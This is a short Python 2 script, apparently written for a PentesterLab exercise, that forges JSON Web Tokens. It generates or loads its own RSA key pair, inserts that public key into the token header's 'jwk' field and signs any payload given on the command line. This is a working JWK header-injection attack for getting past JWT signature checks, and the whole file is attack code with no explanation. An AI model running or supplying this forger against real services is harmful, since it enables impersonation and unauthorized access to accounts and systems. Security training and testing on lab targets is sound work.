#!/usr/bin/python

import sys
import rsa
import base64


def main(argc, argv):
    if argc != 2:
        print "Usage: %s <payload>" % argv[0]
        sys.exit(1)


    (pubkey, privkey) = getKeys()
    
    n = encode(str(pack_bigint(pubkey.n)))
    e = encode(str(pack_bigint(pubkey.e)))
    # n = encode(str(pubkey.n))
    # e = encode(str(pubkey.e))

    # print "N =", n
    # print "E =", e

    h = '{"kty":"RSA","kid":"pentesterlab","use":"sig","n":"'+n+'","e":"'+e+'"}'
    header = '{"alg":"RS256","jwk":'+h+'}'

    payload = encode(argv[1])
    token = encode(header)+'.'+payload

    signature = rsa.sign(token, privkey, 'SHA-256')
    jwt = token + '.' + encode(signature)
    print "\n\n"+jwt


def pack_bigint(i):
    print "\ni =", i
    b = bytearray()
    while i:
        b.append(i & 0xFF)
        i >>= 8
    return b[::-1]


def encode(data):
    return base64.urlsafe_b64encode(data).replace('=','')


def getKeys():
    try:
        with open("pubkey.pem", 'rb') as pubf, open("privkey.pem", 'rb') as privf:
            print 'Loading keys...'
            pubkey = rsa.PublicKey.load_pkcs1(pubf.read())
            privkey = rsa.PrivateKey.load_pkcs1(privf.read())
        return (pubkey, privkey)
    
    except:
        print "Generating keys...\n"
        (pubkey, privkey) = rsa.newkeys(KEY_SIZE)

        with open('pubkey.pem', 'wb') as pubf, open ('privkey.pem', 'wb') as privf:
            pubf.write(pubkey.save_pkcs1(format="PEM"))
            privf.write(privkey.save_pkcs1(format="PEM"))
        return (pubkey, privkey)



KEY_SIZE = 2048


if __name__ == "__main__":
    main(len(sys.argv), sys.argv)

